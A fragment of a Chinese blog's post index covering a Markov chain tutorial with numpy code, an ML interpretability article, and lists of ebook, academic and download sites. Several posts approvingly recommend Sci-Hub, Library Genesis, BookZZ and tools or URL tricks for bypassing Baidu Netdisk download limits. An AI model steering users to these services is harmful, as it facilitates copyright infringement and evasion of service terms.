希望这些总结可以帮助每一个人都能更好的为自己的开源项目选择一个合适的开源协议，当自己的开源项目被侵权的时候不至于处于被动的位置，也希望可以帮助到每一个人都能“合法”的应用开源项目，很多开源协议最低要求是使用者需要保留原作者对代码的声明，估计大家都会忽略掉了吧。 开源不等于免费，开源也不等于没有约束。","link":"/2019/10/05/开源协议/"},{"title":"马尔可夫链","text":"通俗理解马尔可夫链 （Markov Chain）是什么鬼 它是随机过程中的一种过程，一个统计模型，到底是哪一种过程呢？好像一两句话也说不清楚，还是先看个例子吧。 先说说我们村智商为0的王二狗，人傻不拉几的，见人就傻笑，每天中午12点的标配，仨状态：吃，玩，睡。这就是传说中的状态分布。 你想知道他n天后中午12点的状态么？是在吃，还是在玩，还是在睡？这些状态发生的概率分别都是多少？ （知道你不想，就假装想知道吧学习真的好累） 先看个假设，他每个状态的转移都是有概率的，比如今天玩，明天睡的概率是几，今天玩，明天也玩的概率是几几，还是先看个图吧，更直观一些。 这个矩阵就是转移概率矩阵P，并且它是保持不变的，就是说第一天到第二天的转移概率矩阵跟第二天到第三天的转移概率矩阵是一样的。（这个叫时齐，不细说了，有兴趣的同学自行百度）。 有了这个矩阵，再加上已知的第一天的状态分布，就可以计算出第N天的状态分布了。 这个矩阵就是转移概率矩阵P，并且它是保持不变的，就是说第一天到第二天的转移概率矩阵跟第二天到第三天的转移概率矩阵是一样的。（这个叫时齐，不细说了，有兴趣的同学自行百度）。 有了这个矩阵，再加上已知的第一天的状态分布，就可以计算出第N天的状态分布了。 正式理解概述马尔科夫链定义本身比较简单，它假设某一时刻状态转移的概率只依赖于它的前一个状态。举个形象的比喻，假如每天的天气是一个状态的话，那个今天是不是晴天只依赖于昨天的天气，而和前天的天气没有任何关系。当然这么说可能有些武断，但是这样做可以大大简化模型的复杂度，因此马尔科夫链在很多时间序列模型中得到广泛的应用，比如循环神经网络RNN，隐式马尔科夫模型HMM等，当然MCMC也需要它。 如果用精确的数学定义来描述，则假设我们的序列状态是…Xt−2,Xt−1,Xt,Xt+1,…，那么我们的在时刻Xt+1的状态的条件概率仅仅依赖于时刻Xt，即： 既然某一时刻状态转移的概率只依赖于它的前一个状态，那么我们只要能求出系统中任意两个状态之间的转换概率，这个马尔科夫链的模型就定了。我们来看看下图这个马尔科夫链模型的具体的例子(来源于维基百科)。 这个马尔科夫链是表示股市模型的，共有三种状态：牛市（Bull market）, 熊市（Bear market）和横盘（Stagnant market）。每一个状态都以一定的概率转化到下一个状态。比如，牛市以0.025的概率转化到横盘的状态。这个状态概率转化图可以以矩阵的形式表示。如果我们定义矩阵阵P某一位置P(i,j)的值为P(j|i),即从状态i转化到状态j的概率，并定义牛市为状态0， 熊市为状态1, 横盘为状态2. 这样我们得到了马尔科夫链模型的状态转移矩阵为： 讲了这么多，那么马尔科夫链模型的状态转移矩阵和我们蒙特卡罗方法需要的概率分布样本集有什么关系呢？这需要从马尔科夫链模型的状态转移矩阵的性质讲起。 马尔科夫链模型状态转移矩阵的性质 得到了马尔科夫链模型的状态转移矩阵，我们来看看马尔科夫链模型的状态转移矩阵的性质。 仍然以上面的这个状态转移矩阵为例。假设我们当前股市的概率分布为：[0.3,0.4,0.3],即30%概率的牛市，40%概率的熊盘与30%的横盘。然后这个状态作为序列概率分布的初始状态t0，将其带入这个状态转移矩阵计算t1,t2,t3…的状态。代码如下： 1234567import numpy as npmatrix = np.matrix([[0.9,0.075,0.025],[0.15,0.8,0.05],[0.25,0.25,0.5]], dtype=float)vector1 = np.matrix([[0.3,0.4,0.3]], dtype=float)for i in range(100): vector1 = vector1*matrix print(\"Current round:\" , i+1) print(vector1) 部分输出结果如下： 1234567891011121314151617181920Current round: 1[[ 0.405 0.4175 0.1775]]Current round: 2[[ 0.4715 0.40875 0.11975]]Current round: 3[[ 0.5156 0.3923 0.0921]]Current round: 4[[ 0.54591 0.375535 0.078555]]。。。。。。Current round: 58[[ 0.62499999 0.31250001 0.0625 ]]Current round: 59[[ 0.62499999 0.3125 0.0625 ]]Current round: 60[[ 0.625 0.3125 0.0625]]。。。。。。Current round: 99[[ 0.625 0.3125 0.0625]]Current round: 100[[ 0.625 0.3125 0.0625]] 可以发现，从第60轮开始，我们的状态概率分布就不变了，一直保持在[0.625 0.3125 0.0625]，即62.5%的牛市，31.25%的熊市与6.25%的横盘。那么这个是巧合吗？ 我们现在换一个初始概率分布试一试，现在我们用[0.7,0.1,0.2]作为初始概率分布，然后这个状态作为序列概率分布的初始状态t0，将其带入这个状态转移矩阵计算t1,t2,t3…的状态。代码如下： 123456matrix = np.matrix([[0.9,0.075,0.025],[0.15,0.8,0.05],[0.25,0.25,0.5]], dtype=float)vector1 = np.matrix([[0.7,0.1,0.2]], dtype=float)for i in range(100): vector1 = vector1*matrix print(\"Current round:\" , i+1) print(vector1) 部分输出结果如下： 1234567891011121314151617181920Current round: 1[[ 0.695 0.1825 0.1225]]Current round: 2[[ 0.6835 0.22875 0.08775]]Current round: 3[[ 0.6714 0.2562 0.0724]]Current round: 4[[ 0.66079 0.273415 0.065795]]。。。。。。。Current round: 55[[ 0.62500001 0.31249999 0.0625 ]]Current round: 56[[ 0.62500001 0.31249999 0.0625 ]]Current round: 57[[ 0.625 0.3125 0.0625]]。。。。。。。Current round: 99[[ 0.625 0.3125 0.0625]]Current round: 100[[ 0.625 0.3125 0.0625]] 可以看出，尽管这次我们采用了不同初始概率分布，最终状态的概率分布趋于同一个稳定的概率分布[0.625 0.3125 0.0625]， 也就是说我们的马尔科夫链模型的状态转移矩阵收敛到的稳定概率分布与我们的初始状态概率分布无关。这是一个非常好的性质，也就是说，如果我们得到了这个稳定概率分布对应的马尔科夫链模型的状态转移矩阵，则我们可以用任意的概率分布样本开始，带入马尔科夫链模型的状态转移矩阵，这样经过一些序列的转换，最终就可以得到符合对应稳定概率分布的样本。 这个性质不光对我们上面的状态转移矩阵有效，对于绝大多数的其他的马尔科夫链模型的状态转移矩阵也有效。同时不光是离散状态，连续状态时也成立。 同时，对于一个确定的状态转移矩阵P，它的n次幂Pn在当n大于一定的值的时候也可以发现是确定的，我们还是以上面的例子为例，计算代码如下： 12345matrix = np.matrix([[0.9,0.075,0.025],[0.15,0.8,0.05],[0.25,0.25,0.5]], dtype=float)for i in range(10): matrix = matrix*matrix print(\"Current round:\" , i+1) print(matrix) 输出结果如下： 123456789101112131415161718192021222324252627282930Current round: 1[[ 0.8275 0.13375 0.03875] [ 0.2675 0.66375 0.06875] [ 0.3875 0.34375 0.26875]]Current round: 2[[ 0.73555 0.212775 0.051675] [ 0.42555 0.499975 0.074475] [ 0.51675 0.372375 0.110875]]。。。。。。Current round: 5[[ 0.62502532 0.31247685 0.06249783] [ 0.6249537 0.31254233 0.06250397] [ 0.62497828 0.31251986 0.06250186]]Current round: 6[[ 0.625 0.3125 0.0625] [ 0.625 0.3125 0.0625] [ 0.625 0.3125 0.0625]]Current round: 7[[ 0.625 0.3125 0.0625] [ 0.625 0.3125 0.0625] [ 0.625 0.3125 0.0625]]。。。。。。Current round: 9[[ 0.625 0.3125 0.0625] [ 0.625 0.3125 0.0625] [ 0.625 0.3125 0.0625]]Current round: 10[[ 0.625 0.3125 0.0625] [ 0.625 0.3125 0.0625] [ 0.625 0.3125 0.0625]] 我们可以发现，在n≥6以后，P的n次方的值稳定不再变化，而且每一行都为[0.625 0.3125 0.0625]，这和我们前面的稳定分布是一致的。这个性质同样不光是离散状态，连续状态时也成立。 好了，现在我们可以用数学语言总结下马尔科夫链的收敛性质了： 如果一个非周期的马尔科夫链有状态转移矩阵P, 并且它的任何两个状态是连通的，那么limn→∞Pnij与i无关，我们有： 上面的性质中需要解释的有： 1）非周期的马尔科夫链：这个主要是指马尔科夫链的状态转化不是循环的，如果是循环的则永远不会收敛。幸运的是我们遇到的马尔科夫链一般都是非周期性的。用数学方式表述则是：对于任意某一状态i，d为集合{n|n≥1,Pnii&gt;0} 的最大公约数，如果 d=1 ，则该状态为非周期的。 2）任何两个状态是连通的：这个指的是从任意一个状态可以通过有限步到达其他的任意一个状态，不会出现条件概率一直为0导致不可达的情况。 3）马尔科夫链的状态数可以是有限的，也可以是无限的。因此可以用于连续概率分布和离散概率分布。 4）π通常称为马尔科夫链的平稳分布。 参考链接： 马尔可夫链五分钟简单入门 马尔可夫链 小白都能看懂的马尔可夫链 动态在线演示： http://setosa.io/ev/markov-chains/","link":"/2019/10/05/马尔可夫链/"},{"title":"电子类书籍搜索网站","text":"「万千合集站」万千合集站融合了大学、考研等各种教科书的网盘下载链接，种类非常齐全。 当然，网站为了盈利，广告可能多些，但资源确实很全，而且提供百度网盘链接也是方便无比。 打开网站，比如搜索高等数学，搜到的版本很全，且可按热度、大小等排序，网站应该涉及到文理工科各个领域的教科书、课后答案等PDF的资料文档。 「脚本之家」脚本之家这个网站资源很全，分享代码、脚本和编程类书籍，编程类的pdf书籍资源确实很全，注意的就是下载的时候不要去点上面的高速下载，这应该都是常识了。 「鸠摩搜书」十分有名的一个网站，不管是专业还是娱乐类书籍都能搜到，搜到的多是百度网盘或者微盘链接。 「智奇搜书」智奇搜书和鸠摩搜书类似，也是一个电子书搜索引擎，资源搜索也是比较齐全好用。 「PDF之家」PDF之家分享的书籍也是很多，门类很多，也有教科书，比如计算机类的。 「itbook」itbook是一个免费下载编程类电子书的网站，涵盖了很多中英文的电子书籍，每天限制下载五本，书籍介绍页面有资源解压密码，不过看这些书名也算是淘书的一部分了。 「Library Genesis」国外知名电子书下载站，界面相对比较专业了，从网站栏目上看主要分书籍、文献、杂志等，当然大部分都是外文的，且全部免费。 「BookZZ」如下网站，也是整洁的一个界面，直接输入想要搜索的即可，号称200多万书籍和5000多万论文也不是吹的，提供免费下载。 「Online Books」依然国外站，称免费提供300万本电子书。","link":"/2019/10/04/电子类书籍搜索网站/"},{"title":"工具使用推荐","text":"百度网盘高速下载方法我爱搜盘：https://www.52sopan.com 轻舟网：https://www.qzhou.com.cn 小白盘：https://www.xiaobaipan.com 番茄搜搜：https://www.fqsousou.com 探索云盘：http://tansuo233.com 几款高速下载器电脑端：1.pandownload，推荐指数：★★★★★ 下载链接：http://pandownload.com 2.速盘，推荐指数：★★★★☆ 下载链接：https://www.speedpan.com 3.motrix，推荐指数：★★★ 下载链接：https://motrix.app/ 4.爱奇艺万能播放器，推荐指数：★★★ 下载链接：http://t.cn/R4Pp9zi 手机端：只需要在平时的百度网盘链接中，加入wp两个字母，就可以下载 比如下载下面链接的文件 https://pan.baidu.com/s/1cHQbmXqAfbdn1kjURnsrCw 提取码:1r9z 大家只需要在baidu后面加上wp，变成baiduwp即可，如下 https://pan.baiduwp.com/s/1cHQbmXqAfbdn1kjURnsrCw 然后将链接复制到浏览器回车即可 影视软件合集资源猫（安卓） ★★★★★ 犀函（iOS） ★★★★","link":"/2019/10/04/工具使用推荐/"},{"title":"机器学习模型的“可解释性”","text":"无论您的解决方案的最终目标是什么，终端用户都需要可解释、可关联或可理解的解决方案。 为什么机器学习中的可解释性很重要？在传统统计中，我们通过调查大量的数据来构造和验证假设。我们建立模型来构建规则，我们可以将其纳入我们的模型中。例如，营销公司可以建立一个模型，将营销活动数据与财务数据相关联，以确定构成有效营销活动的是什么。这是一种自上而下的数据科学方法，可解释性是关键，因为它是所定义规则和过程的基石。由于相关性往往不等于因果关系，所以在进行决策和解释时，需要对模型进行很强的理解。 在自下而上的数据科学方法中，我们将部分业务流程委托给机器学习模型。此外，全新的商业创意可通过机器学习实现。自下而上的数据科学通常将手动和部分困难任务自动化。例如制造公司可以将传感器放在他们的机器上并进行预测维护。因此，维护工程师可以更高效地工作，而无需执行昂贵的定期检查。模型可解释性对于验证模型的行为是否符合您的期望是很有必要的，并且它可以与用户建立信任关系，并且可以简化从手动过程到自动化过程的过渡。 图显示在一个自上而下的过程中，您迭代地构造和验证一组假设。在自底向上的方法中，您试图自动化过程从自底向上解决问题。 作为一名数据科学家，您经常关心微调模型以获得最佳性能。数据科学通常被定义为：’给出具有X标签的数据，并以最小误差找到模型’。尽管训练高性能模型的能力对于数据科学家来说是一项关键技能，但能够从更大的角度来看是很重要的。数据和机器学习模型的可解释性是在数据科学的 “有用性”中至关重要的方面之一，它确保模型与您想要解决的问题保持一致。尽管在构建模型时尝试最前沿的技术可能会有很多挑战，但能够正确地解释您的发现是数据科学过程的重要组成部分。 为什么深入分析模型至关重要？作为数据科学家，关注模型可解释性有几个原因。虽然它们之间存在重叠，但能捕捉到可解释性的不同动机： 判别并减轻偏差（Identify and mitigate bias）： 偏差可能存在于任何数据集中，数据科学家需要确定并尝试修正偏差。数据集的规模可能有限，并且不能代表所有数据，或者数据捕获过程可能没有考虑到潜在的偏差。在彻底进行数据分析后，或者分析模型预测与模型输入之间的关系时，偏差往往会变得明显。请注意，解决偏差问题没有唯一的解决方案，但是可解释性的关键一步是意识到潜在的偏差。 其他偏差的例子如下： 例如word2vec向量包含性别偏差（http://wordbias.umiacs.umd.edu/），这是由于他们受过训练的语料库中存在的内在偏差。当你使用这些词向量进行训练模型时，招聘人员搜索“技术简介”将使女性履历保留在最下面。 例如当您在小型数据集上训练目标检测模型时，通常情况下图像的宽度太有限。为了避免只适用于数据中噪音和不重要元素的模型，需要在不同环境，不同光照条件和不同角度下的各种物体图像。 考虑问题的上下文（Accounting for the context of the problem）： 在大多数问题中，您正在使用的数据集仅仅是您正试图解决的问题的粗略表示，而机器学习模型无法捕捉到真实任务的完整复杂性。可解释模型可帮助您了解并解释模型中包含和未包含的因素，并根据模型预测采取行动时考虑问题的上下文情境。 改进泛化能力和性能（Improving generalisation and performance）： 高解释性模型通常有更好的泛化能力。可解释性不是要了解所有数据点的模型的每个细节。必须将可靠的数据，模型和问题理解结合起来才能获得性能更好的解决方案。 道德和法律原因（Ethical and legal reasons）： 在财务和医疗保健这样的行业，审计决策过程并确保它是没有歧视或违反任何法律。随着数据和隐私保护法规（如GDPR）的发展，可解释性变得更加重要。此外，在医疗应用或自动驾驶汽车中，单一不正确的预测会产生重大影响，能够“验证”模型至关重要。因此，系统应该能够解释它是如何达到给定的要求的。 解释你的模型关于模型可解释性的通常引用是，随着模型复杂性的增加，模型可解释性按照同样的速度降低。特征重要性是解释模型的一种基本方法。即使对于深度学习等黑盒模型，也存在提高可解释性的技术。最后，将讨论LIME框架，该框架可作为模型分析的工具箱。 特征重要性（Feature importance） 广义线性模型 广义线性模型（GLM’s）都基于以下原则：如果将特征与模型权重进行线性组合，并通过一个函数 f得到结果，则可以用它来预测各种各样的响应变量。 GLM最常见的应用是回归（线性回归），分类（logistic回归）或建模泊松过程（泊松回归）。训练后得到的权重能直接表示特征重要性，它们提供了内部模型非常具体的解释。 例如在构建文本分类器时，可以绘制最重要的特征，并验证模型是否过拟合。如果最重要的单词不符合您的直觉（例如名称或停用词），则意味着该模型拟合了数据集中的噪音，将在新数据中表现不佳。 从TidyTextMining的文本解释能力的一个可视化的示例。 https://www.tidytextmining.com/02-sentiment-analysis_files/figure-html/pipetoplot-1.png 随机森林和SVM（Random forest and SVM’s） 即使是非线性模型（如基于树的模型（例如随机森林））也能够获取关于特征重要性的信息。基于核的方法（如SVM）中的权重通常不是特征重要性的很好的代表。核方法的优点在于，通过将特征投影到内核空间中，您可以捕获变量之间的非线性关系。另一方面，仅将权重视为一个特征，与交互无关。 图显示一个使用特征重要性可视化出的例子，图中您可以确定模型在学习什么。由于这个模型中很多重要的特征都是指这一天day的信息，所以可能需要添加额外的基于时间的特征会使其效果更好。(Kaggle) https://www.kaggle.com/general/13285 深度学习（Deep learning） 深度学习模型由于参数的数量以及提取和组合特征的复杂方法而导致其不可解释性。作为一类模型，它能够在许多任务中获得最好的性能，许多研究集中在将模型预测与输入相关联。 可解释机器学习的研究论文的数量正在迅速增长(MIT)。 http://people.csail.mit.edu/beenkim/papers/BeenK_FinaleDV_ICML2017_tutorial.pdf 特别是在面向更复杂地文本和图像处理的系统时，很难解释模型实际学到的是什么。研究的主要焦点目前主要是将输出或预测与输入数据关联。虽然在线性模型下这相当容易，但对于深度学习网络来说，它仍然是一个未解决的问题。两种主要方法是基于梯度或基于注意力机制的。 在基于梯度的方法中，使用反向传播计算目标概念的梯度用于生成一个映射，以突出显示输入中用于预测目标概念的重要区域。这通常应用于计算机视觉领域。 Grad-CAM, 一个基于梯度的方法被使用于视觉描述生成。基于输出的文字，方法能够判别出输入图像的那个区域是重要的 基于注意力机制的方法通常与序列数据（例如文本数据）一起使用。除了网络的正常权重之外，注意力权重被训练成 ‘input gates’。这些注意力权重决定最终网络输出中每个不同元素的数量。除了可解释性之外，在基于文本的“问答系统”中也可以带来更好的结果，因为网络能够“关注”其注意力。 在基于注意力机制的自动问答中，可以可视化出文本中哪个单词对于这个问题的答案是最最重要的。 LIME LIME是一个更通用的框架，旨在使“任何”机器学习模型的预测更加可解释。 代码链接：https://github.com/marcotcr/lime 为了保持模型独立性，LIME通过修改本地模型的输入来工作。因此，它不是试图同时理解整个模型，而是修改特定的输入实例，并监控对预测的影响。在文本分类的情况下，这意味着一些词被取代，以确定哪些元素的输入影响了预测。","link":"/2019/10/04/机器学习模型的“可解释性”/"},{"title":"学术网站","text":"sci-hub网址：http://www.sci-hub.tw/ 备用站点：http://www.sci-hub.wang/ 全能文献资源下载工具，是一个由俄罗斯牛人开发的可以下载任意文献杂志的工具，只要输入你想要下载的文献题目、DOI等信息就可以获取到该文献的真实地址并在线浏览，当然更重要的是可以下载。 学术导航网站学术导航网站为大家提供很多入口，比如访问sci-hub，Google学术，免费下载知网，百度文库资料等入库，非常方便！ √ http://www.4243.net √ http://www.6453.net √ http://www.9312.net √ http://www.20009.net √ http://www.sci-hub.ac.cn 百度学术网址：http://xueshu.baidu.com/ 涵盖了各类学术期刊，会议论文，旨在为国内外学者提供最好的科研体验。 百度学术搜素可以检索到收费和免费的学术论文，并通过时间筛选，标题，关键字，摘要，作者，出版物，文献类型被引用的次数等细化指标提高检索的精准性。 通过百度学术，都能搜到知网，万方，维普等学术网站的论文，台湾文献的论文也可以收集，其中的一项论文求救功能，相当实用。 不过，百度学术只是一个学术信息搜索引擎，如果下载还得到知网等数据库。 BASE网址：http://www.base-search.net/ BASE是德国比勒费尔德（Bielefeld)大学图书馆开发的一个多学科的学术搜索引擎，提供对全球异构学术资源的集成检索服务。 它整合了德国比勒费尔德大学图书馆的图书馆目录和大约160个开放资源（超过200万个文档）的数据。 谷歌学术网址： https://zz.glgoo.top/scholar/ https://c.glgoo.top/scholar/ 目前，大陆对谷歌相关网站是屏蔽的，但可以采用一些代理或者镜像网站登陆谷歌学术，我们暂时提供2个比较稳定的谷歌学术。也有镜像网站合集： http://www.4243.net 选择一个进去就可以。 免费搜索学术文章的Google网络应用。2004年11月，Google第一次发布了Google学术搜索的试用版。该项索引包括了世界上绝大部分出版的学术期刊， 可广泛搜索学术文献的简便方法。 可以从一个位置搜索众多学科和资料来源：来自学术著作出版商、专业性社团、预印本、各大学及其他学术组织的经同行评论的文章、论文、图书、摘要和文章。 Library Genesis网址： 1.http://gen.lib.rus.ec/ 2.http://libgen.io/ 3.http://libgen.org/ 4.http://libgen.io/scimag/ Library Genesis号称是帮助全人类知识无版权传播的计划。网站上论文很多，下载方便，还有很多外文书籍和中文书籍，几乎每天都在更新。这也是一个神奇网站，基本上所有的外文书籍和论文都可以搜到并下载，最近的学术论文也可以下载。 Library Genesis和Sci-Hub可谓患难兄弟，之前都因为爱思唯尔惹上纠纷，而且从Library Genesis下载不了的还可以从网页直接链接到Sci-Hub下载。 Cnpiec LINK service网址:http://cnplinker.cnpeak.com/ 一个方便快捷的查阅国外各类期刊文献的综合网络平台，cnpLINKer即“中国链接服务”，目前主要提供约3600种外国期刊的目次和文摘的查询检索，电子全文链接及期刊国内馆藏分布查询功能。并时时与国外出版社保持数据内容的一致性和最新性。 PMC（PubMed Cenral)网址：http://www.ncbi.nlm.nih.gov/pmc/ PubMed Central (PMC) 是美国国立卫生研究院提供的一项服务，存档生物医学，生命科学科研文献，PMC获得NLM(National Library of Medicine)的授权，收录存档生物/医学文献，免费是PMC的核心原则，随着技术的进步，目前文献的数字存储格式可能会淘汰，但PMC永久保存了这些内容.NLM认为数字资料不是用来存储的，持续的应用才是物尽其用，因此免费是PMC的一个核心原则.但是免费并不代表没有版权，资料虽然存储在PMC，作者和出版商才是版权的拥有者，所有使用PMC的用户必须遵守版权声明。 中国知网网址：http://www.cnki.net/ 知网，是国家知识基础设施的概念，由世界银行于1998年提出。CNKI工程是以实现全社会知识资源传播共享与增值利用为目标的信息化建设项目。由清华大学、清华同方发起，始建于1999年6月。提供CNKI 源数据库、外文类、工业类、农业类、医药卫生类、经济类和教育类多种数据库。 其中综合性数据库为中国期刊全文数据库、中国博士学位论文数据库、中国优秀硕士学位论文全文数据库、中国重要报纸全文数据库和中国重要会议文论全文数据库。 每个数据库都提供初级检索、高级检索和专业检索三种检索功能。高级检索功能最常用。 DOAJ网址：https://doaj.org/ DOAJ（Directory of Open Access Journal），由瑞典的隆德大学图书馆Lund University Libraries设立于2003年5月，DOAJ的优势在于收录的期刊有着严格的质量控制，包括很多SCI收录的期刊。 DOAJ收录的OA期刊数量非常多，属于目前最好的OA期刊目录网站。目前DOAJ除了查询OA期刊外，还可以查询部分期刊的文章内容。 Book系列Book系列网站书籍种类丰富，基本专业书籍都可找到免费下载。包括Bookie、Bookzz、Bookfi等，（Bookzz、Bookfi在Library Genesis的导航栏有，但是现在貌似打不开了）。 均可免费下载文献和书籍，文献下载适合前几年的，书籍就不用说了，超级多！其中BookSC网站：（http://zh.booksc.org/）文献资料多。BookSC网站截止到今天，已有278多万书籍以及5242多万文献可以免费下载，大多数是pdf,djvu,eupb格式。 下载也很方便，直接搜论文或者文章题目即可，还可将选择地区并设置成中国。BookSC网站体验很好，搜索后直接点下载就可以了，超级方便！ arXiv网址：https://arxiv.org/ arXiv的亮点是网站上面的文章大多数都是会投稿到学术期刊的文章，投稿作者对文章多半都是保持严谨态度的，只有少部分是一直保持预印本的形式。目前arXiv文章类型主要分为七大类：物理、数学、非线性科学、计算机科学、定量生物学、定量金融学和统计。每个大类下面又分有若干子类，例如物理下面又具体分为：天体物理、凝聚态物理、广义相对论等。文章类型内容分类非常专业和全面。 万方数据库网址：http://www.wanfangdata.com.cn/index.html 万方数据库是由万方数据公司开发的，涵盖期刊、会议纪要、论文、学术成果、学术会议论文的大型网络数据库；也是和中国知网齐名的中国专业的学术数据库。整合数亿条全球优质学术资源，集成期刊、学位、会议、科技报告、专利、视频等十余种资源类型，覆盖各研究层次，感知用户学术背景，智慧搜索。致力于帮助用户精准发现、获取与沉淀学术精华。 中国科技论文在线网址：http://www.paper.edu.cn/ 科学论文专业网站，如果你是理工类的研究生，这个网站绝对是需要翻阅的。尤其是其中的科技期刊分类，有各个期刊和大学学报的联系方式，以及每期的论文下载，最重要的是全面。 专利全文下载网址：http://www.drugfuture.com/cnpat/cn_patent.asp 提供下载号，就能下载你需要的专利。 OA图书馆网址：http://www.oalib.com/ OA图书馆是Open Access图书馆的简称。OA图书馆致力于让中国人可以免费获得高质量的文献，最早提供了很多的Open Access数据库和资源，但是由于OA的数据库资源比较分散并且数据库存储格式不统一，利用起来的非常不方便。在此基础上，他们利用google的搜索技术建立了OA内容的搜索，可以很方便搜索近6000多种期刊资料和5000多个Open Access的数据库资源。现在有420万篇了，后续发展很快。 PublicLibrary of Science网址：https://www.plos.org/科学公共图书馆原是是一家由众多诺贝尔奖得主和慈善机构支持的非赢利性学术组织，旨在推广世界各地的科学和医学领域的最新研究成果。 PLoS出版了多种生命科学与医学领域的开放获取期刊，可以免费获取全文，比较具有影响力。Plos系列的期刊目前都已被SCI收录。虽然期刊数量不多，但是文章总体数量相当庞大。 Socolar网址：http://www.socolar.com/ Socolar是一个旨在为用户提供OA资源检索和全文链接服务的公共服务平台，为非赢利性项目。 用户在使用Socolar时，可以不用注册。收录了来自世界各地、各种语种的重要OA资源，并优先收录经过学术质量控制的期刊（比如同行评审期刊）。 本地Pubmed网址：http://www.yuntsg.com 可在百度中搜索“本地Pubmed”；或直接进入网址：http://www.yuntsg.com本系统是华中科技大学同济医学院与济南泉方科技有限公司合作开发，本系统是在美国PubMed的基础上，参考CiteScore期刊评价系统、泉方学术搜索、德国的GoPubMed等整合开发的检索平台。 需先行注册，注册很简单，只需按照要求填写，注册完成后能够试用3个月时间，如需继续使用得注册其他账号。然后点击上图中本地Pubmed检索系统进入查询页面。 Scientific Research Publishing网址：http://www.scirp.org/ ScientificResearch Publishing（科研出版社，简称SRP)是一家国际综合性开源学术期刊出版机构。 目前已有国际开源英文期刊近三百本，所有期刊都是开源的（OpenAccess，或称开放存取, 简称OA），可免费下载所有期刊全文，所有期刊均回溯至创刊。 多数期刊已被CAS，EBSCO，CAB Abstracts，ProQuest，IndexCopernicus，Library of Congress，Gale，CSP等数据库全文或摘要收录。 NIMS日本国立材料研究网址：http://www.nims.go.jp/eng/ 旗下有NIMS NOW International，NIMS所属的每月通讯，2003年7月成立。每月覆盖范围包括国立材料研究所的最新研究活动，管理政策，在国际合作方面取得的进展，世界著名学者的访问、优秀的研究人员和工作人员，以及其他信息，报告当前的科研进展以及材料科学的重要趋势。 NIMS在以下领域已经被公认为全球的领导者，包括：高温高压技术合成单晶金刚石和氮化硼；N型掺杂金刚石薄膜；光电应用，如深紫外激光和发光二极管；氮化硼纳米管的生长与表征；超导和有机材料；功能陶瓷，如超塑性陶瓷等；纳米颗粒催化作用；电子束诱导沉积——一种利用离子束和电子显微镜合成纳米结构和器件的技术； 此外，NIMS已经在一些全新的器件和技术领域开始开拓：原子开关——一种控制原子运动的纳米级半导体器件；基于单壁碳纳米管的全世界最小温度计；巨电致伸缩效应；暖喷涂——一种高效的在金属，聚合物和玻璃上进行涂覆的新技术。 不仅如此，NIMS还具有在线材料数据库：http://mits.nims.go.jp/index_en.html 。绝对是查询材料参数的好去处。 HighWire Press 数据库网址：http://highwire.stanford.edu/lists/allsites.dtl HighWire Press是全球最大的提供免费全文的学术文献出版商;于1995年由美国斯坦福大学图书馆创立。最初仅出版著名的周刊“Journal of Biological Chemistry”，现提供1300余种期刊，涵盖生物科学、人文、医学、物理科学、社会科学等大类。标为free的可免费访问全文。 Nature网址：http://www.nature.com/nature/index.html 在2014年12月时，《自然》（Nature）也宣布了开放所有研究论文，包括旗下48个杂志，可惜不能免费复制、打印或下载。 中国学术会议在线网址：http://www.meeting.edu.cn/meeting/indexS.jsp 适用于投稿学术会议，为用户提供学术会议信息预报，会议分类搜素，会议在线报名，会议论文征集，会议资料发布，会议视频点播，会议同步直播等服务。 科学网网址：http://www.sciencenet.cn/ 科学网是由中国科学院，中国工程院和国家自然科学基金委员会主管，科学时报社主办的综合性科学网站。 主要提供快捷权威的科学新闻报道，丰富实用的科学信息服务以及交流互动的网络平台，目标是建成最具影响力的华人科学社区，查询国际会议也很方便。 台大學術期刊資料庫网址：http://ejournal.press.ntu.edu.tw/ 「台大学术期刊数据库」收录台大各学术研究单位出版之中外学术期刊论文篇目与全文，审查过程严谨、内容丰富详实、撰写格式一致，具相当程度之学术水平，为查询台湾一流学府之学术研究发展、辅助教学研究之最佳数据库。 数据库内容采实时更新方式，收录自民国91年(公元2002年) 1月起出刊之台大各中外学术期刊、论文书目资料，以及自民国92年(公元2003年)1月起出刊之期刊电子全文档案，并且现正逐批回溯建档中。 EBOOKEE网址：https://ebookee.org/ 该站书籍种类丰富，基本专业书籍都可找到。这一系列网站唯一不好的地方就是网络硬盘存储，下载麻烦，有广告。部分网络硬盘在国内可能被墙，需要挂代理，不过淘宝上有代下国外网盘的服务。 SciELO科技在线电子图书馆网址：http://www.scielo.org/ 1998年，巴西开通了第一个“科技在线电子图书馆（SciELO）”，随后扩展到阿根廷、智利、西班牙、古巴、哥伦比亚、葡萄牙、委内瑞拉七国。目前已提供613种专业期刊、20万篇论文全文供读者免费阅览。 NSTL开放学术资源系统网网址：http://oar.nstl.gov.cn/开放获取期刊集成检索系统是集期刊浏览、期刊检索两种功能为一体的开放式的期刊集成揭示与检索系统。 系统提供刊名字顺浏览、学科分类浏览两种浏览方式，且浏览过程中可通过期刊的一般信息与详细信息切换提示，进一步了解某个期刊的全部信息，其中包括刊名、ISSN、主题、学科分类、期刊内容揭示层次等15种相关信息。同时用户可对刊名、ISSN、主题、出版者及全部字段进行期刊检索。 Exlibris 开放获取电子期刊查询系统网址：http://coreej.cceu.org.cn/index.html Exlibris开放获取电子期刊查询系统是由艾利贝斯公司为中国用户联合会用户提供的免费期刊查询服务。除一般检索外，用户可按学科进行快速分类浏览，也可以依据OA期刊、核心期刊、NSTL订购期刊进行查找。该系统还对投稿及全文获取进行了很有效的指引。 国家哲学社会科学文献中心网址：http://www.ncpssd.org 国家哲学社会科学文献中心是由中国社会科学院牵头，教育部和国家新闻出版广电总局配合建设，2016年12月30日正式上线运行。 主要开设有资讯、资源、专题、服务四个栏目，资源包括中文期刊、外文期刊、外文图书、古籍四类，收录哲学社会科学相关领域文献共计10,000,000余条，提供有线阅读、全文下载等服务；还收录有国内外哲学社会科学领域重要的政府机构、高等院校、学术机构以及数据库的链接便于广大读者查阅、使用。 初步形成国家哲学社会科学学术期刊数据库，外文学术期刊数据库，中国社会科学院科研成果数据库等特色资源数据库。 SCHOLARVOX International网址：http://www.scholarvox.com/ SCHOLARVOX International 网站包括管理学，社会学，工程学，信息学等学科的20000多本电子书，有英文有法文，可在线阅读。 EBSCO网址：https://www.ebscohost.com/ EBSCO以商务数据为主，经济，金融，管理，市场营销，物流学的论文可在该网站找到一些大型企业的SWOT分析，公司简介，公司营业状况数据等，该网站还收录了不少营销学杂志，文献等。 ECONLIT网址：https://www.aeaweb.org/econlit 